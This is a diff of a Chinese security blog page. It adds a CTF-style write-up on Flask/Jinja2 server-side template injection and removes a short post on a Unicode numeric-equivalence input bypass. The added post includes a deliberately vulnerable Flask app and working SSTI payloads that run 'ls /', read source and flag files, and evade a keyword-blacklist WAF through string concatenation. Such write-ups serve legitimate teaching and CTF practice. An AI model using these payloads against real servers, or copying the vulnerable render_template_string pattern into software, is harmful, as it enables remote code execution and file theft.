@@ -169,6 +169,101 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-flask模板漏洞之使用内置类执行命令和文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/09/flask%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%AE%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%92%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  	<time datetime="2021-09-08T16:00:00.000Z" itemprop="datePublished">2021-09-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/09/flask%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%AE%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%92%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+        flask模板漏洞之使用内置类执行命令和文件读取
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="flask模板漏洞"><a href="#flask模板漏洞" class="headerlink" title="flask模板漏洞"></a>flask模板漏洞</h1><p>对于flask模板漏洞，我们可以通过看源码中是否有格式化字符串来判断是否有flask模板漏洞</p>
+<p>然后如果存在flask模板漏洞，我们可以利用flask模板中内置类来进行文件的读取和命令的执行，而模板中的变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">控制结构：&#123;% %&#125;</span><br><span class="line"></span><br><span class="line">变量取值：&#123;&#123; &#125;&#125;</span><br><span class="line"></span><br><span class="line">注释：&#123;# #&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python中重要的魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__class__返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__mro__返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</span><br><span class="line"></span><br><span class="line">__base__返回该对象所继承的基类</span><br><span class="line"></span><br><span class="line">__subclasses__每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表</span><br><span class="line"></span><br><span class="line">__init__类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<p>我根据一些题目写了一个exp，可以进行flask模板的测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, Blueprint, request, Response, escape ,render_template_string</span><br><span class="line"></span><br><span class="line">from urllib.parse import urlsplit, urlunsplit, unquote</span><br><span class="line"></span><br><span class="line">from urllib import parse</span><br><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span><br><span class="line"></span><br><span class="line">def decode():</span><br><span class="line"></span><br><span class="line">    if request.values.get(&#x27;text&#x27;) :</span><br><span class="line"></span><br><span class="line">        text = request.values.get(&quot;text&quot;)</span><br><span class="line"></span><br><span class="line">        tmp = &quot;resulst ： &#123;0&#125;&quot;.format(text)</span><br><span class="line"></span><br><span class="line">        return render_template_string(tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">        app.run(debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本后，我们可以通过</p>
+<p>获取字符串的类对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>寻找基类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看实现类和成员</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;.__class__.mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们可以使用内置类进行文件的读取和命令的执行，由于辛苦总结后，竟然发现无法上传，所以请看SSTI语句总结的网址</p>
+<p>同时我们也可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>来读取config文件，它包含了应用程序所有配置，详细可看各类模板漏洞那篇</p>
+<p>对于SSTI语句总结，详细请看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a></p>
+<h2 id="对于实例，我们在解密界面，随便输入字符，发现报错，并会回显一些源码"><a href="#对于实例，我们在解密界面，随便输入字符，发现报错，并会回显一些源码" class="headerlink" title="对于实例，我们在解密界面，随便输入字符，发现报错，并会回显一些源码"></a>对于实例，我们在解密界面，随便输入字符，发现报错，并会回显一些源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span><br><span class="line">def decode():</span><br><span class="line">	if request.values.get(&#x27;text&#x27;) :</span><br><span class="line">		text = request.values.get(&quot;text&quot;)</span><br><span class="line">		text_decode = base64.b64decode(text.encode())</span><br><span class="line">		tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())</span><br><span class="line">		if waf(tmp) :</span><br><span class="line">			flash(&quot;no no no !!&quot;)</span><br><span class="line">			return redirect(url_for(&#x27;decode&#x27;))</span><br><span class="line">		res =  render_template_string(tmp)    # 模板渲染</span><br></pre></td></tr></table></figure>
+<p>其中这行代码存在格式化字符串，所以存在模板漏洞注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用内置类来获取系统目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>但是发现有个waf，所以我们使用open来读取app.py的全部源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>发现waf的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def waf(str):</span><br><span class="line">black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,</span><br><span class="line">&quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]</span><br><span class="line">for x in black_list :</span><br><span class="line">if x in str.lower() :</span><br><span class="line">return 1</span><br></pre></td></tr></table></figure>
+<p>发现许多的方法被过滤掉，所以我们可以使用字符串拼接来找目录和执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后发现flag文件，用open进行读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF/" rel="tag">模板</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-异或加盲注" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -916,72 +1011,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-unicode编码安全问题" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/04/unicode%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="article-date">
-  	<time datetime="2021-09-03T16:00:00.000Z" itemprop="datePublished">2021-09-04</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/04/unicode%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
-        unicode编码安全问题
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="unicode编码安全问题"><a href="#unicode编码安全问题" class="headerlink" title="unicode编码安全问题"></a>unicode编码安全问题</h1><p>当打开页面时，发现是一个购买的网页，然后输入id为1、2或3，然后输入price，发现显示是错误的商品，然后输入id为4，输入price为1337时，回显只能是一个字符</p>
-<p>而后我们再看源码，发现有一个重要的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;!--Ah,really important,seriously. --&gt;</span><br></pre></td></tr></table></figure>
-<p>因此，我们可以想到使用unicode编码中的等价性来绕过只能输入一个字符的限制，所以我们可以在下面的网站搜索大于1337的字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/</span><br><span class="line"></span><br><span class="line">搜索框输入：thousands</span><br></pre></td></tr></table></figure>
-
-<p>即可查到大于1000或等于1000的字符，然后取出它的utf-8的形式，将/u改为%即可</p>
-<p>unicode设计有许多安全的问题，详细请看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">浅谈Unicode设计安全：https://xz.aliyun.com/t/5402</span><br><span class="line"></span><br><span class="line">unicode等价性浅谈：https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li></ul>
 	</div>
 
       
